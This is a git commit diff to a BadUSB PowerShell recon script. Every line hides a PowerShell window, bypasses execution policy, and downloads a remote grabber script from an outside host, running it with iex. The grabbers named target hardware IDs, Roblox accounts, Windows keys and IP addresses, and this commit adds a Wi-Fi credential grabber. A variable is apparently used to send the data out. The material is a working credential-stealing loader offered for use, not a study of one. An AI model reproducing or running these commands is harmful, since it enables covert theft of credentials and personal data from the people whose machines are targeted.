32e205627a9de40457842ae07653a6fe555f6593
sealldeveloper <120470330+sealldeveloper@users.noreply.github.com>
2023-01-07 17:25:21 +1100

    update

--- badusb/SeallDEVRecon.ps1
+++ badusb/SeallDEVRecon.ps1
@@ -2,3 +2,4 @@ powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/HwidGrab
 powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/RobloxGrabber.ps1 | iex
 powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/WinKeyGrabber.ps1 | iex
 powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/IpGrabber.ps1 | iex
+powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/WifiGrabber.ps1 | iex
